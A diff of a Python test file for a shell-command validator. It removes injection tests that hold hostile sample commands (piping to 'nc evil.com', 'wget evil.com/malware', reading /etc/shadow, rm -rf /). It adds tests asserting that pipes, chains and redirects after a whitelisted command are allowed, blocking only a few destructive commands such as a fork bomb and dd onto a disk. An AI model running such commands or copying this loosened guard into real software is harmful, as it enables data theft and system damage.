@@ -37,54 +37,47 @@ class TestPathTraversal:
             pass  # Either is acceptable
 
 
-class TestShellInjection:
+class TestShellSecurity:
+    """New security model: JWT admin auth is the gate, bash -c for full shell.
+    Only catastrophic commands are blocked at kernel level."""
+
     @pytest.fixture
     def exec(self):
         return ShellExecutor(whitelist=["ls", "echo", "cat"])
 
-    def test_semicolon(self, exec):
-        with pytest.raises(AuthorizationError):
-            exec.validate_command("ls; rm -rf /")
+    def test_pipe_allowed(self, exec):
+        """Pipes are now allowed — first command whitelisted."""
+        assert exec.validate_command("ls | grep test") is True
 
-    def test_pipe(self, exec):
-        with pytest.raises(AuthorizationError):
-            exec.validate_command("ls | nc evil.com 1234")
+    def test_chain_allowed(self, exec):
+        assert exec.validate_command("ls && echo done") is True
 
-    def test_and_chain(self, exec):
-        with pytest.raises(AuthorizationError):
-            exec.validate_command("ls && cat /etc/shadow")
+    def test_redirect_allowed(self, exec):
+        assert exec.validate_command("echo test > /tmp/test.txt") is True
 
-    def test_or_chain(self, exec):
-        with pytest.raises(AuthorizationError):
-            exec.validate_command("ls || wget evil.com/malware")
-
-    def test_backtick(self, exec):
-        with pytest.raises(AuthorizationError):
-            exec.validate_command("echo `whoami`")
-
-    def test_dollar_paren(self, exec):
-        with pytest.raises(AuthorizationError):
-            exec.validate_command("echo $(cat /etc/passwd)")
-
-    def test_redirect_out(self, exec):
-        with pytest.raises(AuthorizationError):
-            exec.validate_command("echo hack > /etc/crontab")
-
-    def test_redirect_in(self, exec):
-        with pytest.raises(AuthorizationError):
-            exec.validate_command("cat < /etc/shadow")
-
-    def test_newline_injection(self, exec):
-        with pytest.raises(AuthorizationError):
-            exec.validate_command("ls\nrm -rf /")
-
-    def test_whitelist_bypass(self, exec):
-        with pytest.raises(AuthorizationError):
+    def test_rm_rf_root_blocked(self, exec):
+        with pytest.raises(AuthorizationError, match="Blocked dangerous"):
             exec.validate_command("rm -rf /")
 
-    def test_path_bypass(self, exec):
-        with pytest.raises(AuthorizationError):
-            exec.validate_command("/bin/rm -rf /")
+    def test_fork_bomb_blocked(self, exec):
+        with pytest.raises(AuthorizationError, match="Blocked dangerous"):
+            exec.validate_command(":(){ :|:& };:")
+
+    def test_mkfs_system_blocked(self, exec):
+        with pytest.raises(AuthorizationError, match="Blocked dangerous"):
+            exec.validate_command("mkfs /dev/sda1")
+
+    def test_dd_zero_system_blocked(self, exec):
+        with pytest.raises(AuthorizationError, match="Blocked dangerous"):
+            exec.validate_command("dd if=/dev/zero of=/dev/sda")
+
+    def test_not_whitelisted_first_command(self, exec):
+        with pytest.raises(AuthorizationError, match="not in whitelist"):
+            exec.validate_command("nmap 192.168.1.1")
+
+    def test_whitelisted_with_path(self, exec):
+        """Base command extracted from full path."""
+        assert exec.validate_command("/bin/ls -la") is True
 
 
 class TestJWTSecurity:
